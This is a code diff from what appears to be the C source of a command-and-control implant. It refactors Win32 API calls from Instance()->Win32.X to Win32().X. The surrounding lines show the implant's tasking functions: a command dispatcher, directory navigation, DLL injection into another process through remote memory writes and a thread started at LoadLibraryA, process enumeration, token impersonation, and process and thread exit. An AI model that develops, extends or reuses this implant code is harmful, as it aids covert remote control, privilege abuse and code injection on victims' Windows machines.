@@ -66,7 +66,7 @@ FUNC VOID CommandDispatcher(
 
             } while ( Parser.Length > 4 );
 
-            Instance()->Win32.LocalFree( DataBuffer );
+            Win32().LocalFree( DataBuffer );
             DataBuffer = NULL;
 
             ParserDestroy( &Parser );
@@ -79,7 +79,7 @@ FUNC VOID CommandDispatcher(
 
     } while ( TRUE );
 
-    Instance()->Win32.LocalFree( DataBuffer );
+    Win32().LocalFree( DataBuffer );
     Instance()->Session.Connected = FALSE;
 }
 
@@ -226,7 +226,7 @@ FUNC VOID CmdExplorer(
     {
     case CD: {
         PSTR DestDir = ParserGetString( Parser, NULL ); 
-        bCheck = Instance()->Win32.SetCurrentDirectoryA( DestDir );
+        bCheck = Win32().SetCurrentDirectoryA( DestDir );
         if ( bCheck )
             PackageTransmitError( NtLastError() );
 
@@ -235,7 +235,7 @@ FUNC VOID CmdExplorer(
     }
     case PWD: {
         CHAR CurDir[MAX_PATH];
-        bCheck = Instance()->Win32.GetCurrentDirectoryA( MAX_PATH, CurDir );
+        bCheck = Win32().GetCurrentDirectoryA( MAX_PATH, CurDir );
         if ( !bCheck )
             PackageTransmitError( NtLastError() );
         
@@ -285,7 +285,7 @@ FUNC VOID CmdDllInjection(
     bkErrorCode =  bkMemWrite( ProcessHandle, MemoryAlloc, DllPath, StringLengthA( DllPath ) );
     if ( bkErrorCode != 0 ) goto _Leave;
 
-    bkErrorCode =  bkThreadCreate( ProcessHandle, Instance()->Win32.LoadLibraryA, MemoryAlloc, 0, 0, 0, &ThreadHandle );
+    bkErrorCode =  bkThreadCreate( ProcessHandle, Win32().LoadLibraryA, MemoryAlloc, 0, 0, 0, &ThreadHandle );
     if ( bkErrorCode != 0 ) goto _Leave;
 
 _Leave:
@@ -327,13 +327,13 @@ FUNC VOID CmdProcEnum(
 
     MmZero( &Ebi, sizeof( PROCESS_EXTENDED_BASIC_INFORMATION ) );
 
-    Instance()->Win32.NtQuerySystemInformation( SystemProcessInformation, NULL, NULL, &ReturnLen1 );
+    Win32().NtQuerySystemInformation( SystemProcessInformation, NULL, NULL, &ReturnLen1 );
 
-    Spi = Instance()->Win32.LocalAlloc( LPTR, ReturnLen1 );
+    Spi = Win32().LocalAlloc( LPTR, ReturnLen1 );
 
     ValToFree = Spi;
 
-    bkErrorCode =  Instance()->Win32.NtQuerySystemInformation( SystemProcessInformation, Spi, ReturnLen1, &ReturnLen1 );
+    bkErrorCode =  Win32().NtQuerySystemInformation( SystemProcessInformation, Spi, ReturnLen1, &ReturnLen1 );
     if ( bkErrorCode != STATUS_SUCCESS ) {
         PackageTransmitError( bkErrorCode );
         return;
@@ -352,7 +352,7 @@ FUNC VOID CmdProcEnum(
 
         GetTokenUserA( TokenHandle, &UserBuff, &UserBuffLen );
 
-        bkErrorCode =  Instance()->Win32.NtQueryInformationProcess( 
+        bkErrorCode =  Win32().NtQueryInformationProcess( 
             UlongToHandle( Spi->UniqueProcessId ), ProcessBasicInformation,
             &Ebi, sizeof( PROCESS_EXTENDED_BASIC_INFORMATION ), NULL 
         ); 
@@ -450,7 +450,7 @@ FUNC VOID CommandToken(
                 PackageTransmitError( NtLastError() ); return;
             }
 
-            bCheck = Instance()->Win32.ImpersonateLoggedOnUser( TokenHandle );
+            bCheck = Win32().ImpersonateLoggedOnUser( TokenHandle );
             if ( !bCheck ) {
                 PackageTransmitError( NtLastError() ); return;
             }
@@ -497,7 +497,7 @@ FUNC VOID CmdExitProcess(
 
     BK_PACKAGE = PackageCreate( COMMAND_EXITP );
 
-    Instance()->Win32.RtlExitUserProcess( 0 );
+    Win32().RtlExitUserProcess( 0 );
 }
 
 FUNC VOID CmdExitThread(
@@ -507,5 +507,5 @@ FUNC VOID CmdExitThread(
 
     BK_PACKAGE = PackageCreate( COMMAND_EXITT );
 
-    Instance()->Win32.RtlExitUserThread( 0 );
+    Win32().RtlExitUserThread( 0 );
 }
